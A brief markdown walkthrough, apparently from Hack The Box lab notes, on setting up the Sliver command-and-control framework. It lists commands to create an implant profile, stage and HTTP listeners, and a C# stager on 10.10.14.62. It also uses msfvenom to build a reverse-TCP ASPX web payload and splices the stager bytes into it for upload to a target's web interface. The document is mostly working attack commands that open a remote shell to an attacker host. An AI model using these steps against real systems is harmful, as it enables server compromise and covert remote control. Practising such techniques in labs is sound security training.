Sliver C2 is a popular open-source Command and Control (C2) framework

# Install

wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux

# Run
./sliver-server_linux 

<img width="1232" height="697" alt="image" src="https://github.com/user-attachments/assets/52a809e4-8f1e-4890-b685-29017e650f5a" />

# Command-by-Command Explanation (IP is attacker IP because it is creating sliver C2 server)

1. Creates a new implant profile named htb.
The profile is configured to use HTTP for C2 communication to 10.10.14.62:8088.
```
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb
```

2. Starts a staging listener (also called stage listener) on tcp://10.10.14.62:4443.
This listener is linked to the htb profile.
```
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb
```

3. Listener
```
sliver > http -L 10.10.14.62 -l 8088
```

4. Generates a small stager (initial dropper) that points to the stage listener (10.10.14.62:4443). Saves it to staged.txt.
```
sliver > generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
```

# Use msfvenom to create sliver.aspx
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx
```
## Copy staged.txt bytes and paste that into sliver.aspx including byte number

### Staged.txt
<img width="802" height="476" alt="image" src="https://github.com/user-attachments/assets/9bb7ea53-99b2-4c27-bbee-17d50d006e07" />

### sliver.aspx
<img width="927" height="727" alt="image" src="https://github.com/user-attachments/assets/f51dade1-ec7d-4a04-9263-e7758f5a9b51" />


# After that upload to the web interface and listen it

<img width="1097" height="291" alt="image" src="https://github.com/user-attachments/assets/9b2e6f76-713f-44ed-8321-4c1cd0b272ea" /> 

---

<img width="911" height="442" alt="image" src="https://github.com/user-attachments/assets/975f003a-9233-4c64-9ed9-f647eda8b8f4" />


